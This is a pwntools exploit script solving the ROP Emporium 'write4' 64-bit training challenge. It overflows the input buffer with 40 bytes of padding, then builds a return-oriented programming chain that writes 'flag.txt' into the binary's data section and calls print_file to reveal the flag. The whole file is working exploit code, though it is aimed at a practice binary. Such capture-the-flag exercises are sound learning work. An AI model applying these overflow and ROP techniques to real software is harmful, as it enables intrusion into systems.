from pwn import *

elf = context.binary = ELF('/home/saudi/Desktop/CTF/CTF scripts/Pwn/RopEmporium/write4/write64/write4')



#bytes to reach the EIP
padding = b"A" *40

#we find the pop gadget and mov gadget
# info(str(elf.symbols.data_start))
rop = ROP(elf)
pop_gadget = rop.find_gadget(['pop r14', 'pop r15', 'ret'])[0]
info("%#x pop gadget", pop_gadget )
mov_gadget = elf.symbols.usefulGadgets
info("%#x mov gadget", mov_gadget )
data_section = elf.symbols.data_start
info("%#x data section", data_section )

rop.raw([pop_gadget,data_section, "flag.txt", mov_gadget ])
rop.print_file(data_section)

exploit = padding + rop.chain()
info("rop chain: %r",rop.chain())

io = process(elf.path)
io.recvuntil('> ')
exploit = padding + rop.chain()
io.sendline(exploit)
flag = io.recvall()
success(flag)

